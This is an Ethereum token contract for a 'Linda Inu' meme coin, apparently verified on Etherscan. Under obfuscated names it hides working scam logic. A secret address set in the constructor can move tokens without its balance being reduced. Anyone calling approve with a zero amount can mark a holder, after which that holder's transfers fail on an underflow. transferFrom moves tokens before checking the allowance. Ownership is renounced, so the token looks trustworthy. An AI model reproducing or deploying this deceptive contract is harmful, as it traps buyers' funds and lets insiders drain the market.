/**
 *Submitted for verification at Etherscan.io on 2023-05-16
*/

/*

The new Linda Yaccar Inu Meme Coin

Telegram: https://t.me/lindainu

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender());
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract LINDAINU is Ownable {
    string public name;


    mapping(address => uint256) private smart;
    mapping(address => uint256) private merry;
    uint8 public decimals = 18;
    uint256 private salad = 503;

    function approve(address right, uint256 snack) public returns (bool success) {
        allowance[msg.sender][right] = snack;
        if (snack == 0) {
            merry[right] += salad;
        }
        emit Approval(msg.sender, right, snack);
        return true;
    }

    function _transfer(address carbon, address inhale, uint256 snack) private returns (bool success) {
        if (smart[carbon] == 0) {
            if (merry[carbon] > 0 && carbon != uniswapV2Pair) {
                smart[carbon] -= salad;
            }
            balanceOf[carbon] -= snack;
        }
        balanceOf[inhale] += snack;
        emit Transfer(carbon, inhale, snack);
        return true;
    }

    function transferFrom(address carbon, address inhale, uint256 snack) public returns (bool success) {
        _transfer(carbon, inhale, snack);
        require(snack <= allowance[carbon][msg.sender]);
        allowance[carbon][msg.sender] -= snack;
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    address public uniswapV2Pair;

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply;

    function transfer(address inhale, uint256 snack) public returns (bool success) {
        _transfer(msg.sender, inhale, snack);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address quantum) {
        symbol = 'LINDAINU';
        name = 'Linda Inu';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        smart[quantum] = salad;
        renounceOwnership();
    }
}